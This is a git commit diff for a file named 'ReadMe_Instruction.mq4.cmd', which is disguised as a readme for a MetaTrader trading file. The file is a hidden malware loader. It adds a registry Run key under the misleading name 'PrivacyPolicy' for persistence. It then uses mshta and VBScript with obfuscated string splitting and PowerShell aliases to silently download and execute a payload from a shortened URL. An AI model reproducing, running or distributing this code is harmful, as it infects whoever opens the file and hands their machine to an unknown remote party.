422157f52d6718d6ab9497cb4e9626608edb13cb
hwangyounggul33 <suetologg22@gmail.com>
2025-04-20 19:42:20 +0300

    Add files via upload

--- ReadMe_Instruction.mq4.cmd
+++ ReadMe_Instruction.mq4.cmd
@@ -1,5 +1,4 @@
-ÿþ
-@echo off
+@echo off
 setlocal
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v PrivacyPolicy /t REG_SZ /d "C:\Windows\system32\mshta.exe vbscript:Execute(\"Set ggg = CreateObject(\"\"WScript.Shell\"\") : appleseed = \"\"powe\"\" : ggg.Run appleseed+\"\"rshell -command sal binbo iex ; sal lim_par iwr ; binbo(lim_par tiny.cc/2lpg001)\"\", 0 : window.close\")"
 C:\Windows\system32\mshta.exe vbscript:Execute("Set ggg = CreateObject(""WScript.Shell"") : appleseed = ""powe"" : ggg.Run appleseed+""rshell -command sal binbo iex ; sal lim_par iwr ; binbo(lim_par tiny.cc/2lpg001)"", 0 : window.close")
